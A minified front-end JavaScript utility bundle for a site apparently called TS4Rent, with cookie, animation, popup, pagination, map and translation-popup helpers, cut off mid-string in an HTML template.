function setCookie(e,t,a){var i="";if(a){var o=new Date;o.setTime(o.getTime()+24*a*60*60*1e3),i="; expires="+o.toGMTString()}document.cookie=e+"="+t+i+"; path=/"}function getCookie(e){for(var t=e+"=",a=document.cookie.split(";"),i=0;i<a.length;i++){for(var o=a[i];" "==o.charAt(0);)o=o.substring(1,o.length);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return null}function deleteCookie(e){setCookie(e,"",-1)}function flyToTarget(e){if(void 0===e||void 0===e.element||void 0===e.target)return!1;e.element=$(e.element),e.target=$(e.target);var t=e.element.offset().left,a=e.element.offset().top,i=e.element.width(),o=e.element.height(),n=e.target.offset().left,s=e.target.offset().top,r=e.target.width(),l=e.target.height();void 0===e.speed&&(e.speed=1e3),void 0===e.fade&&(e.fade=.5),void 0===e.resizeWidth&&(e.resizeWidth=!0),void 0===e.resizeHeight&&(e.resizeHeight=!1);var c={left:n,top:s};!1!==e.fade&&(c.opacity=e.fade),!0===e.resizeWidth&&(c.width=r),!0===e.resizeHeight&&(c.height=l),e.element.clone().appendTo("body").css({position:"absolute",zIndex:5,top:a,left:t,width:i,height:o}).animate(c,e.speed,(function(){$(this).remove(),"function"==typeof e.callback&&e.callback()}))}function animate(e,t,a){switch(e=$(e),t){case"shake":e.animate({"margin-left":10,"margin-right":-10},150).animate({"margin-left":-10,"margin-right":10},150).animate({"margin-left":5,"margin-right":-5},200).animate({"margin-left":-5,"margin-right":5},200).animate({"margin-left":0,"margin-right":0},300,(function(){$(this).css({"margin-left":"","margin-right":""})}));break;case"blink":e.animate({opacity:.3},100).animate({opacity:1},100).animate({opacity:.3},200).animate({opacity:1},500,(function(){$(this).css({opacity:""})}));break;case"jump":e.animate({opacity:.5,"margin-top":"-10px"},200).animate({opacity:1,"margin-top":0},200).animate({opacity:.5,"margin-top":"-5px"},150).animate({opacity:1,"margin-top":0},150,(function(){$(this).css({opacity:"","margin-top":""})}))}"function"==typeof a&&a()}function animateScroll(e,t,a){void 0===e&&(e=$(document).height()-$(window).height()),void 0===t&&(t=1e3),$("html, body").animate({scrollTop:e},t,(function(){"function"==typeof a&&a()}))}function animateScrollTo(e,t,a){0!=$(e).length&&(void 0===t&&(t=1e3),$("html, body").animate({scrollTop:$(e).offset().top-100},t,(function(){"function"==typeof a&&a()})))}function ucfirst(e){return e.charAt(0).toUpperCase()+e.slice(1)}function reloadImage(e){var t=$(e);if(0!=t.length){var a=t.attr("src"),i=a.indexOf("?"),o=new Date;i>=0&&(a=a.substr(0,i)),t.attr("src",a+"?q="+o.getTime())}}function loadCSS(e){document.createStyleSheet?document.createStyleSheet(e):$("head").append($('<link rel="stylesheet" href="'+e+'" type="text/css" media="screen" />'))}function highlight(e,t,a){var i=new RegExp("(>*[^<]*)("+escapeRegex(t)+")([^<]*)","gi"),o="$1<span"+(a?' class="'+a+'"':"")+">$2</span>$3";return e.replace(i,o)}function escapeRegex(e){return"string"==typeof e?e.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"):e}function escapeHTML(e){return"string"==typeof e&&(e=(e=(e=(e=(e=e.replace(/&/g,"&amp;")).replace(/"/g,"&quot;")).replace(/'/g,"&#039;")).replace(/</g,"&lt;")).replace(/>/g,"&gt;")),e}function rescapeHTML(e){return"string"==typeof e&&(e=(e=(e=(e=(e=e.replace(/&gt;/gi,">")).replace(/&lt;/gi,"<")).replace(/&#039;/g,"'")).replace(/&quot;/gi,'"')).replace(/&amp;/gi,"&")),e}function isJsonString(e){try{JSON.parse(e)}catch(e){return!1}return!0}function isBuggySafari(){if(navigator.userAgent){var e=navigator.userAgent;if(/ip(hone|od|ad)/gi.test(e)&&/OS 8_0 /gi.test(e)&&!/CriOS/gi.test(e))return 1}return 0}function hasFlash(){try{if(new ActiveXObject("ShockwaveFlash.ShockwaveFlash"))return!0}catch(e){if(null!=navigator.mimeTypes["application/x-shockwave-flash"])return!0}return!1}function toggleInvisible(e){e.toggleClass("invisible")}function switchClass(e,t,a,i){$(e).removeClass(t),$(e).addClass(a),"function"==typeof i&&i()}function switchTab(e,t,a){$(e).addClass("invisible"),$(t).removeClass("invisible"),"function"==typeof a&&a()}function swapTab(e,t,a,i){void 0!==e&&(void 0===t&&(t="active"),"invert"==a?$(e).removeClass(t).siblings().addClass(t):$(e).addClass(t).siblings().removeClass(t),"function"==typeof i&&i())}function numbersInput(e){$(e).keydown((function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||!(65!=e.keyCode&&67!=e.keyCode&&88!=e.keyCode||!0!==e.ctrlKey&&!0!==e.metaKey)||229==e.keyCode||!e.keyCode||e.keyCode>=35&&e.keyCode<=40||(e.shiftKey||e.keyCode<48||e.keyCode>57)&&(e.keyCode<96||e.keyCode>105)&&e.preventDefault()}))}function pageLoader(e,t){if(0==$("#pageLoader").length){$("body").append('<div id="pageLoader" class="invisible"><div class="dimmer"></div><div class="imgContainer"><div class="loaderText"></div></div></div>')}"show"==e&&$("#pageLoader").removeClass("invisible"),"hide"==e&&$("#pageLoader").addClass("invisible"),void 0===t?$("#pageLoader .loaderText").html("Please Wait!"):$("#pageLoader .loaderText").html(t)}function getTimeString(e){var t=new Date,a=new Date(e),i=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],o=function(e){return e<10?"0"+e:e};if(void 0===e)return"Long Ago";if(a.getTime()>t.getTime())return"Now";if(a.getFullYear()<t.getFullYear())return i[a.getMonth()]+" "+o(a.getDate())+", "+a.getFullYear();if(t.getTime()-a.getTime()<36e5){var n=Math.round((t.getTime()-a.getTime())/1e3),s=Math.round(n/60);return n<60?n+" sec ago":s+" min ago"}if(a.getFullYear()+"-"+a.getMonth()+"-"+a.getDate()==t.getFullYear()+"-"+t.getMonth()+"-"+t.getDate()){var r=t.getHours()-a.getHours();return r<11?r+" hours ago":"Today, "+o(a.getHours())+":"+o(a.getMinutes())}return i[a.getMonth()]+" "+o(a.getDate())+", "+o(a.getHours())+":"+o(a.getMinutes())}function getTimeLeft(e){var t=e;isNaN(parseInt(e))&&(t=(Date.parse(e)-Date.parse(new Date))/1e3),t<0&&(t=0);var a=function(e){return e<10?"0"+e:e},i=Math.floor(t%60),o=Math.floor(t/60%60),n=Math.floor(t/3600%24),s=Math.floor(t/86400),r=a(o)+":"+a(i);return n&&(r=a(n)+":"+r),s&&(r=s+"d "+r),{str:r,total:t,days:s,hours:n,minutes:o,seconds:i}}function toggleAlert(e,t,a){if(void 0===e)return $("#alert").fadeOut("fast",(function(){$(this).remove()})),!1;void 0===t&&(t="TS4Rent"),$("#alert").remove();var i='<div id="alert"><div class="alert-box"><div class="alert-title">'+t+'</div><div class="alert-content">'+e+'</div><div class="alert-buttons mrgBot3"><a href="javascript:void(0);" class="pink button visible ok mrgAuto" style="width:220px;">OK</a></div></div><div id="popup-dimmer" onclick="$(\'#alert\').remove();"></div></div>';$("body").append(i),$("#alert").fadeIn(),centerAlert(),$("#alert a.ok").unbind().on("click",(function(e){e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),toggleAlert()})),"function"==typeof a&&a()}function centerAlert(){$("#alert .alert-box").center()}function alertWidth(e){$("#alert .alert-box").css("width",e+"px").center()}function toggleConfirm(e,t,a){if("object"!=typeof e)return $("#confirm").fadeOut("fast",(function(){$(this).remove()})),!1;void 0===e.title&&(e.title="Confirm"),void 0===e.text&&(e.text="Confirm"),"object"!=typeof e.buttons&&(e.buttons={}),void 0===e.buttons.confirmLabel&&(e.buttons.confirmLabel="Confirm"),void 0===e.buttons.confirmClass&&(e.buttons.confirmClass="button pink"),void 0===e.buttons.cancelLabel&&(e.buttons.cancelLabel="Cancel"),void 0===e.buttons.cancelClass&&(e.buttons.cancelClass="button gray"),$("#confirm").remove();var i='<div id="confirm"><div class="confirm-box"><div class="confirm-title"><div class="right popup-close" onclick="$(\'#confirm\').remove();">X</div>'+e.title+'</div><div class="confirm-content">'+e.text+'</div><div class="confirm-buttons"><a href="javascript:void(0);" class="confirm mrgRight2 '+e.buttons.confirmClass+'">'+e.buttons.confirmLabel+'</a><a href="javascript:void(0);" class="cancel button '+e.buttons.cancelClass+'">'+e.buttons.cancelLabel+'</a></div></div><div id="popup-dimmer" onclick="$(\'#confirm\').remove();"></div></div>';$("body").append(i),$("#confirm").fadeIn(),centerConfirm(),$("#confirm a.confirm").unbind().on("click",(function(a){a.preventDefault(),a.stopPropagation(),a.stopImmediatePropagation(),"function"==typeof t?(void 0===e.stay&&toggleConfirm(),t()):toggleConfirm()})),$("#confirm a.cancel").unbind().on("click",(function(e){e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),toggleConfirm()})),"function"==typeof a&&a()}function centerConfirm(){$("#confirm .confirm-box").center()}function confirmWidth(e){$("#confirm .confirm-box").css("width",e+"px").center()}function setPagination(e){if(void 0===e)return!1;if(void 0===e.container)return!1;if(void 0===e.page)return!1;if(e.page=parseInt(e.page),(isNaN(e.page)||e.page<1)&&(e.page=1),void 0===e.totalPages?e.totalPages=1:(e.totalPages=parseInt(e.totalPages),(isNaN(e.totalPages)||e.totalPages<1)&&(e.totalPages=1)),void 0===e.pageSelect&&(e.pageSelect={}),void 0===e.pageSelect.enabled&&(e.pageSelect.enabled=!0),(void 0===e.next||e.page==e.totalPages&&1==e.pageSelect.enabled)&&(e.next=0),void 0!==e.prev&&1!=e.page||(e.prev=0),!e.next&&!e.prev||e.totalPages<2&&1==e.pageSelect.enabled)return $(e.container).empty(),!1;void 0===e.buttons&&(e.buttons={}),void 0===e.buttons.nextSmall&&(e.buttons.nextSmall={}),void 0===e.buttons.nextSmall.label&&(e.buttons.nextSmall.label=translate("common-next")+" &raquo;"),void 0===e.buttons.nextSmall.className&&(e.buttons.nextSmall.className="button pink mrgLeft2"),void 0===e.buttons.nextFull&&(e.buttons.nextFull={}),void 0===e.buttons.nextFull.label&&(e.buttons.nextFull.label=translate("common-loadmore")),void 0===e.buttons.nextFull.className&&(e.buttons.nextFull.className="button block"),void 0===e.buttons.prevSmall&&(e.buttons.prevSmall={}),void 0===e.buttons.prevSmall.label&&(e.buttons.prevSmall.label="&laquo; "+translate("common-prev")),void 0===e.buttons.prevSmall.className&&(e.buttons.prevSmall.className="button pink mrgRight2"),void 0===e.buttons.prevFull&&(e.buttons.prevFull={}),void 0===e.buttons.prevFull.label&&(e.buttons.prevFull.label=translate("common-previous")),void 0===e.buttons.prevFull.className&&(e.buttons.prevFull.className="button block");var t="",a="",i="";if(e.next&&(t=1==e.page?'<a href="javascript:void(0);" class="next '+e.buttons.nextFull.className+'">'+e.buttons.nextFull.label+"</a>":'<a href="javascript:void(0);" class="next nextnext '+e.buttons.nextSmall.className+'">'+e.buttons.nextSmall.label+"</a>"),e.prev&&(a=e.next?'<a href="javascript:void(0);" class="prev prevprev '+e.buttons.prevSmall.className+'">'+e.buttons.prevSmall.label+"</a>":'<a href="javascript:void(0);" class="prev '+e.buttons.prevFull.className+'">'+e.buttons.prevFull.label+"</a>"),e.next&&e.prev&&e.pageSelect.enabled){void 0===e.pageSelect.step&&(e.pageSelect.step=100),void 0===e.pageSelect.optionPrefix&&(e.pageSelect.optionPrefix=""),void 0===e.pageSelect.class&&(e.pageSelect.class="");var o=e.page-e.pageSelect.step<1?1:e.page-e.pageSelect.step,n=e.page+e.pageSelect.step>e.totalPages?e.totalPages:e.page+e.pageSelect.step;i='<div class="inlineBlock"><select class="ps pagination-select '+e.pageSelect.class+'">',1!=o&&(i+='<option value="1">1</option>');for(var s=o;s<=n;s++)i+='<option value="'+s+'" '+(s==e.page?'selected="selected"':"")+">"+e.pageSelect.optionPrefix+s+"</option>";n<e.totalPages&&(i+='<option value="'+e.totalPages+'">'+e.totalPages+"</option>"),i+="</select></div>"}$(e.container).html(a+i+t),"function"==typeof e.buttons.nextCallback&&$(e.container).find(".next").on("click",(function(){e.buttons.nextCallback(e.page+1)})),"function"==typeof e.buttons.prevCallback&&$(e.container).find(".prev").on("click",(function(){e.buttons.prevCallback(e.page-1)})),"function"==typeof e.pageSelect.callback&&$(e.container).find(".ps").on("change",(function(){e.pageSelect.callback(parseInt($(this).val()))})),"function"==typeof e.callback&&e.callback()}function centerPosition(e,t){switch(e=$(e),t){case"absolute":e.css({position:"absolute",top:Math.round(($(window).height()-e.outerHeight())/2)+"px",left:Math.round(($(window).width()-e.outerWidth())/2)+"px"});break;case"fixed":default:e.css({position:"fixed",top:"50%",left:"50%","margin-top":"-"+Math.round(e.outerHeight()/2)+"px","margin-left":"-"+Math.round(e.outerWidth()/2)+"px"})}}function loadZclip(e){if(void 0===e)return!1;hasFlash()?$(e.target).zclip({path:"/public/js/zclip/ZeroClipboard.swf",copy:function(){return void 0!==e.text?e.text:""},afterCopy:function(){"function"==typeof e.aftercopy?e.aftercopy():toggleAlert("Link Copied")}}):"function"==typeof e.noflash&&e.noflash()}function loadClipboard(e){if(!e||!e.target||void 0===e.text)return!1;if("function"!=typeof Clipboard)return"function"==typeof e.error?e.error():$(e.target).unbind("click").on("click",(function(){prompt("Copy the text below and press Enter",e.text)})),!1;var t=new Clipboard(e.target,{text:function(){return e.text}});t.on("success",(function(t){"function"==typeof e.success?e.success():toggleAlert("Copied to your clipboard!")})),t.on("error",(function(t){"function"==typeof e.error?e.error():prompt("Copy the text below and press Enter",e.text)}))}function loadChosen(e){void 0===e&&(e=".chosen"),0!=$(e).length&&$(e).chosen({width:"100%",search_contains:!0})}function loadIsotope(e,t,a){if(void 0===e&&(e=".isotope"),0!=(e=$(e)).length&&(void 0===t&&(t="li"),0!=e.find(t).length))if(e.hasClass("isotope")&&e.isotope("destroy"),void 0===a)e.isotope({itemSelector:t});else{var i=function(){var a=e.width();return Math.floor(a/Math.floor(a/e.find(t).first().outerWidth(!0)))};e.isotope({resizable:!1,itemSelector:t,masonry:{columnWidth:i()}}),$(window).unbind("smartresize").smartresize((function(){e.isotope({masonry:{columnWidth:i()}})}))}}function loadFancyBox(e){void 0===e&&(e=".fancybox"),0!=$(e).length&&$(e).fancybox({})}function loadPhotoSwipe(e){void 0===e&&(e=".photoSwipe"),0!=$(e).length&&$(e).photoSwipe({jQueryMobile:!0,enableMouseWheel:!1,enableKeyboard:!1,allowUserZoom:!1,backButtonHideEnabled:!0,captionAndToolbarFlipPosition:!0,captionAndToolbarAutoHideDelay:0})}function setDropZone(e,t,a,i,o,n){void 0!==e.element&&void 0!==e.accept&&(void 0===e.activeClass&&(e.activeClass=""),void 0===e.hoverClass&&(e.hoverClass=""),void 0===e.tolerance&&(e.tolerance="pointer"),$(e.element).droppable({accept:e.accept,activeClass:e.activeClass,hoverClass:e.hoverClass,tolerance:e.tolerance,activate:function(e,t){"function"==typeof a&&a(e,t)},deactivate:function(e,t){"function"==typeof i&&i(e,t)},over:function(e,t){"function"==typeof o&&o(e,t)},out:function(e,t){"function"==typeof n&&n(e,t)},drop:function(e,a){"function"==typeof t&&t(e,a)}}))}function destroyDropZone(e){e.hasClass("ui-droppable")&&e.droppable("destroy")}function setSortableZone(e,t,a,i){void 0!==e.element&&void 0!==e.items&&(void 0===e.cursor&&(e.cursor="move"),void 0===e.tolerance&&(e.tolerance="intersect"),void 0===e.placeholder&&(e.placeholder=!1),void 0===e.fps&&(e.fps=!1),void 0===e.helper&&(e.helper="original"),void 0===e.fhs&&(e.fhs=!1),void 0===e.handle&&(e.handle=!1),void 0===e.axis&&(e.axis=!1),void 0===e.zIndex&&(e.zIndex=1e3),void 0===e.opacity&&(e.opacity=!1),void 0===e.revert&&(e.revert=!0),void 0===e.delay&&(e.delay=100),$(e.element).sortable({items:e.items,cursor:e.cursor,tolerance:e.tolerance,placeholder:e.placeholder,forcePlaceholderSize:e.fps,helper:e.helper,forceHelperSize:e.fhs,handle:e.handle,axis:e.axis,zIndex:e.zIndex,opacity:e.opacity,revert:e.revert,delay:e.delay,start:function(e,t){"function"==typeof a&&a(e,t)},stop:function(e,t){"function"==typeof i&&i(e,t)},update:function(e,a){"function"==typeof t&&t(e,a)}}),$(e.element).disableSelection())}function destroySortableZone(e){e.hasClass("ui-sortable")&&e.sortable("destroy")}function countChars(e,t){return void 0!==e&&(void 0===t&&(t=100),(e=$(e)).val().length>t&&e.val(e.val().substr(0,t)),e.parent().find(".counter").text(t-e.val().length+" "+translate("common-charactersleft")),!0)}function inputValidStatus(e,t,a){return void 0!==e&&(0!=(e=$(e)).length&&(1==t?(e.parent().find(".inputError").text(""),0==e.parent().find(".chosen").length?(e.parent().find(".inputIcon .iconGreen, .inputIcon .iconRed").addClass("invisible"),e.parent().find(".inputIcon .iconGreen").removeClass("invisible"),e.removeClass("borderRed")):e.parent().find("a.chosen-single").removeClass("borderRed")):(e.parent().find(".inputError").text(a),0==e.parent().find(".chosen").length?(e.parent().find(".inputIcon .iconRed, .inputIcon .iconGreen").addClass("invisible"),e.parent().find(".inputIcon .iconRed").removeClass("invisible"),e.addClass("borderRed")):e.parent().find("a.chosen-single").addClass("borderRed")),!0))}$.fn.extend({disableSelection:function(){return this.each((function(){this.onselectstart=function(){return!1},this.unselectable="on",$(this).css("-moz-user-select","none"),$(this).css("-webkit-user-select","none")}))},center:function(e){return"absolute"==e?this.each((function(){$(this).css({position:"absolute",top:Math.round(($(window).height()-$(this).outerHeight())/2)+"px",left:Math.round(($(window).width()-$(this).outerWidth())/2)+"px"})})):this.each((function(){$(this).css({position:"fixed",top:"50%",left:"50%","margin-top":"-"+Math.round($(this).outerHeight()/2)+"px","margin-left":"-"+Math.round($(this).outerWidth()/2)+"px"})}))}});var pagesHistory=new Array,popstateBind=!1,pushNewState=!0;function bindPushState(e,t,a){history.pushState&&(pushNewState&&(pagesHistory.push(t),window.history.pushState(null,null,e)),!1===popstateBind&&(popstateBind=!0,$(window).unbind("popstate").bind("popstate",(function(e){if(pagesHistory.length>0){var t=pagesHistory.pop();"function"==typeof a&&(pushNewState=!1,a(t),pushNewState=!0)}}))))}function replaceHistoryURL(e){window.history.replaceState&&window.history.replaceState(null,null,e)}function loadSubnavPage(e,t,a){pageLoader("show");var i=$(e),o=t.split("/",3),n=void 0===o[2]||""==o[2]?o[1]+"-index":o[1]+"-"+o[2];$("body").attr("id",o[1]+"Page");var s=$("body").attr("class").split(" ");$("body").removeClass().addClass(n),$.each(s,(function(e,t){/settings|mailbox|master/gi.test(t)||$("body").addClass(t)})),bindPushState(t,[$("ul.subnav li.current"),window.location.pathname],(function(e){loadSubnavPage(e[0],e[1])})),i.siblings().removeClass("current"),i.addClass("current"),$("#settings-right > *").fadeOut("fast"),$("#settings-right").unbind("load").load(t+" #settings-right > *",(function(e){var t=$(e);$("#right").length>0&&$("#right").html(t.find("#right .overviewBox")),initScripts(),loadChosen(),"function"==typeof a&&a(),$("#settings-right > *").css("display","none"),animateScroll(0,350,(function(){pageLoader("hide"),$("#settings-right > *").fadeIn()}))}))}function inputValidStatus(e,t,a){return void 0!==e&&(0!=(e=$(e)).length&&(1==t?(e.parent().find(".inputError").text(""),0==e.parent().find(".chosen").length?(e.parent().find(".inputIcon .iconGreen, .inputIcon .iconRed").addClass("invisible"),e.parent().find(".inputIcon .iconGreen").removeClass("invisible"),e.removeClass("borderRed")):e.parent().find("a.chosen-single").removeClass("borderRed")):(e.parent().find(".inputError").text(a),0==e.parent().find(".chosen").length?(e.parent().find(".inputIcon .iconRed, .inputIcon .iconGreen").addClass("invisible"),e.parent().find(".inputIcon .iconRed").removeClass("invisible"),e.addClass("borderRed")):e.parent().find("a.chosen-single").addClass("borderRed")),!0))}pagesHistory=new Array,popstateBind=!1,pushNewState=!0;function bindPushState(e,t,a){history.pushState&&(pushNewState&&(pagesHistory.push(t),window.history.pushState(null,null,e)),!1===popstateBind&&(popstateBind=!0,$(window).unbind("popstate").bind("popstate",(function(e){if(pagesHistory.length>0){var t=pagesHistory.pop();"function"==typeof a&&(pushNewState=!1,a(t),pushNewState=!0)}}))))}function loadSubnavPage(e,t,a){pageLoader("show");var i=$(e),o=t.split("/",3),n=void 0===o[2]||""==o[2]?o[1]+"-index":o[1]+"-"+o[2];$("body").attr("id",o[1]+"Page");var s=$("body").attr("class").split(" ");$("body").removeClass().addClass(n),$.each(s,(function(e,t){/settings|mailbox|master/gi.test(t)||$("body").addClass(t)})),bindPushState(t,[$("ul.subnav li.current"),window.location.pathname],(function(e){loadSubnavPage(e[0],e[1])})),i.siblings().removeClass("current"),i.addClass("current"),$("#settings-right > *").fadeOut("fast"),$("#settings-right").unbind("load").load(t+" #settings-right > *",(function(e){var t=$(e);$("#right").length>0&&$("#right").html(t.find("#right .overviewBox")),initScripts(),loadChosen(),"function"==typeof a&&a(),$("#settings-right > *").css("display","none"),animateScroll(0,350,(function(){pageLoader("hide"),$("#settings-right > *").fadeIn()}))}))}function bindSelectChange(){$(".mobileSelect").on("change",(function(){var e=$(this).find("option:selected").text();$(this).parent().find(".txt").text(e),0!=$(this).val()&&$(this).parent().removeClass("borderRed")})).change()}function gmapByAddress(e){return void 0!==e&&(void 0!==e.address&&void 0!==e.target&&void(new google.maps.Geocoder).geocode({address:e.address},(function(t,a){if(a==google.maps.GeocoderStatus.OK){"function"==typeof e.prepare&&e.prepare();var i=t[0].geometry.location.lat(),o=t[0].geometry.location.lng();e.result={},e.latitude=i,e.longitude=o;var n=new google.maps.LatLng(i,o),s={zoom:void 0!==e.zoom?e.zoom:15,center:n,disableDefaultUI:!1,mapTypeId:google.maps.MapTypeId.ROADMAP,mapTypeControl:!0,mapTypeControlOptions:{style:google.maps.MapTypeControlStyle.DROPDOWN_MENU},streetViewControl:!0,zoomControl:!0,zoomControlOptions:{style:google.maps.ZoomControlStyle.SMALL}},r=new google.maps.Map(document.getElementById(e.target),s),l=new google.maps.Marker({draggable:void 0!==e.dragablePin,position:n,title:void 0!==e.pinTitle?e.pinTitle:e.address,map:r,icon:void 0!==e.pinIcon?e.pinIcon:"/public/images/icons/map-pin.png"}),c=new google.maps.InfoWindow({content:void 0!==e.infoWindow?e.infoWindow:e.address});google.maps.event.addListener(l,"click",(function(){c.open(r,l)})),"function"==typeof e.pinDragEnd&&google.maps.event.addListener(l,"dragend",(function(t){e.pinDragEnd(t)})),google.maps.event.trigger(r,"resize"),r.setCenter(n),c.open(r,l),"function"==typeof e.success&&e.success(e)}else"function"==typeof e.error&&e.error(e)})))}function gmapByGPS(e){if(void 0===e.target)return!1;"function"==typeof e.prepare&&e.prepare();var t=new google.maps.LatLng(e.latitude,e.longitude),a={zoom:void 0!==e.zoom?e.zoom:15,center:t,disableDefaultUI:!1,mapTypeId:google.maps.MapTypeId.ROADMAP,mapTypeControl:!0,mapTypeControlOptions:{style:google.maps.MapTypeControlStyle.DROPDOWN_MENU},streetViewControl:!0,zoomControl:!0,zoomControlOptions:{style:google.maps.ZoomControlStyle.SMALL}},i=new google.maps.Map(document.getElementById(e.target),a),o=new google.maps.Marker({draggable:void 0!==e.dragablePin,position:t,title:void 0!==e.pinTitle?e.pinTitle:null,map:i,icon:void 0!==e.pinIcon?e.pinIcon:"/public/images/icons/map-pin-face.png"});"function"==typeof e.pinDragEnd&&google.maps.event.addListener(o,"dragend",(function(t){e.pinDragEnd(t)})),"function"==typeof e.callback&&e.callback()}var mapKey="wMR37Z5aHmVVJrEqnw4eSSLzhZ8WWzGF";function mapByGPS(e){if(void 0===e.target)return!1;"function"==typeof e.prepare&&e.prepare();var t=tomtom.L.map(e.target,{key:mapKey,basePath:"sdk-maps",center:[e.latitude,e.longitude],zoom:void 0!==e.zoom?e.zoom:15}),a={draggable:void 0!==e.dragablePin,icon:tomtom.L.icon({iconUrl:void 0!==e.pinIcon?e.pinIcon:"/public/images/icons/map-pin-face.png",iconSize:[41,57],iconAnchor:[41,57]})},i=tomtom.L.marker([e.latitude,e.longitude],a).addTo(t);"function"==typeof e.pinDragEnd&&i.on("dragend",(function(t){e.pinDragEnd(t)})),"function"==typeof e.callback&&e.callback()}function mapByAddress(e){return void 0!==e&&(void 0!==e.address&&void 0!==e.target&&void tomtom.geocode({key:mapKey}).query(e.address).callback((function(t){if(!t)return"function"==typeof e.error&&e.error(e),!1;"function"==typeof e.prepare&&e.prepare();var a=t[0].position.lat,i=t[0].position.lon;e.result={},e.latitude=a,e.longitude=i;var o=tomtom.L.map(e.target,{key:mapKey,basePath:"sdk-maps",center:[a,i],zoom:void 0!==e.zoom?e.zoom:15}),n=tomtom.L.marker([a,i],{draggable:void 0!==e.dragablePin,icon:tomtom.L.icon({iconUrl:void 0!==e.pinIcon?e.pinIcon:"/public/images/icons/map-pin-face.png",iconSize:[41,57],iconAnchor:[41,57]})}).addTo(o);"function"==typeof e.pinDragEnd&&n.on("dragend",(function(t){e.pinDragEnd(t)})),"function"==typeof e.success&&e.success(e)})).go())}var translationData={selectedTo:0,selectedFrom:1,fromLng:{},toLng:{},phrases:{},progress:0};function loadTranslations(){$(".translatephrasejs").each((function(){var e=$(this);e.replaceWith(translate(e.text()))}))}function translate(e,t){if("undefined"==typeof langTranslations)return'<span class="translatephrasejs">'+e+"</span>";if(langTranslations[lang]&&void 0!==langTranslations[lang][e]){if(!$.isEmptyObject(t)){var a=langTranslations[lang][e];return $.each(t,(function(e,t){var i="%"+e+"%";a=a.replace(new RegExp(i,"g"),t)})),a}return langTranslations[lang][e]}if(void 0!==langTranslations.en[e]){if(!$.isEmptyObject(t)){a=langTranslations.en[e];return $.each(t,(function(e,t){a=a.replace("%"+e+"%",t)})),a}return langTranslations.en[e]}return e}function changeLanguage(e){$.ajax({type:"GET",url:"/ajax/language/"+e,cache:!1,data:{},success:function(e){var t=$.parseJSON(e);1==t.success&&(window.location=t.location+window.location.pathname)}})}function translateActions(e){var t,a={action:e},i=$("#translateBoxContainer"),o=i.find(".translate-content-js"),n=i.find(".next-js"),s=i.find(".skip-js"),r=i.find(".reload-js"),l=i.find(".loading-js"),c=i.find(".thank-you-js");switch(e){case"openPopupTranslate":case"openPopupCheck":a.fromLng=$("#translateFrom").val(),a.toLng=$("#translateTo").val(),translationData.selectedTo=$("#translateTo").val(),a.toLng=translationData.selectedTo,a.fromLng=translationData.selectedFrom,t=function(t){if(1==t.success){translationData.fromLng=t.fromLng,translationData.toLng=t.toLng,translationData.phrases=t.data,translationData.phCount=t.phrasesCount,translationData.progress=0;var a="openPopupTranslate"==e?translateBoxPattern(0):checkTranslationBoxPattern(0);i.html(a).fadeIn(),$("#translateBoxContainer").draggable({handle:".translateBoxHeader"})}else i.html("").fadeOut(),toggleAlert(t.message)};break;case"skip":case"skip-check":var d=++translationData.progress;return d<translationData.phCount?o.hide("fast",(function(){var t="skip"==e?translateBoxPattern(d):checkTranslationBoxPattern(d);i.html(t),$(this).show()})):(o.hide("fast",(function(){c.text(translate("todo")).fadeIn()})),n.addClass("invisible"),s.addClass("invisible"),r.removeClass("invisible")),void l.fadeOut("fast");case"reload":case"reload-check":return void c.text("Thank you for supporting TS4RENT").hide("fast",(function(){l.fadeIn("fast",(function(){translateActions("reload"==e?"openPopupTranslate":"openPopupCheck")}))}));case"next":case"next-check":a.action="next"==e?"saveTranslation":"saveCheck",a.fromLng=translationData.fromLng.language_id,a.toLng=translationData.toLng.language_id,a=$.param(a)+"&"+$("#translationForm").serialize(),o.hide("fast",(function(){$(this).find(".loading-js").show()})),n.addClass("disabled"),t=function(t){n.removeClass("disabled"),1==t.success?translateActions("skip"+("next-check"==e?"-check":"")):0==t.type?(l.hide("fast",(function(){o.show()})),i.find(".to-lng-label-js").addClass("txtRed").text(translationData.toLng.name_local+" - "+t.message)):1==t.type&&(l.hide("fast"),c.text(t.message).show("fast",(function(){n.addClass("invisible"),s.addClass("invisible"),r.removeClass("invisible")})))};break;case"iGiveUp":return void $(".translateBox").fadeOut();default:return}$.ajax({type:"POST",url:"/ajax/translate",cache:!1,data:a,success:function(e){pageLoader("hide");var a=$.parseJSON(e);"function"==typeof t&&t(a)}})}function callTranslatePopup(e){void 0!==e&&1!=e||toggleConfirm({title:"Translate TS4Rent",text:'<p>You can now help make TS4Rent become a truly global and better place for all the non-English speaking people out there!</p><p>Choose the language you want to translate:</p><div class="clear chosenNoSearch mrgTop4 mrgBot4"><div class="floatLeft split2"><div class="mrgRight"><select class="chosen" id="translateFromPopUp"><option value="1" selected>From English</option></select></div></div><div class="floatLeft split2"><div class="mrgLeft"><select class="chosen" id="translateToPopUp">'+(1==userID?'<option value="2" selected="selected">Français</option>':"")+(1==userID?'<option value="3" selected="selected">Español</option>':"")+(1==userID?'<option value="7" selected="selected">Português</option>':"")+(1==userID?'<option value="11" selected="selected">Русский</option>':"")+(1==userID?'<option value="8" selected="selected">Italiano</option>':"")+(1==userID?'<option value="5" selected="selected">Deutsch</option>':"")+"</select></div></div></div>",buttons:{confirmLabel:"Translate"}},(function(){translateActions("openPopupTranslate")}),(function(){loadChosen("#translateFromPopUp, #translateToPopUp")}));$(".translate-popup-container-js").find(".translate-popup-toolbar-js").removeClass("active").hide().removeAttr("style").trigger("mouseout"),$.ajax({type:"POST",url:"/ajax/lngcheck",cache:!1,data:"",success:function(e){}})}function checkTranslationBoxPattern(e){for(var t=translationData.phrases[e],a="",i=0;i<=9;i++)a+='<div class="translateBoxProgressBar '+(i<=translationData.progress?"active":"")+'"></div>';return'<form id="translationForm"><input type="hidden" name="phraseID" value="'+t.phrase_id+'" /><div class="translateBoxHeader clear"><div class="floatRight translateBoxGiveUp mrgTop0 pointer" onclick="translateActions(\'iGiveUp\');">X</div><div class="translateBoxTitle">Translate: <span class="txt16 txtBold"><span>'+translationData.fromLng.short+"</span> &#x2192; <span>"+translationData.toLng.short+'</span></span></div></div><div class="translateBoxProgress clear">'+a+'</div><div class="translateBoxContentContainer"><div class="translateBoxLoader relative loading-js"><div class="translateBoxLoaderBallb"><div 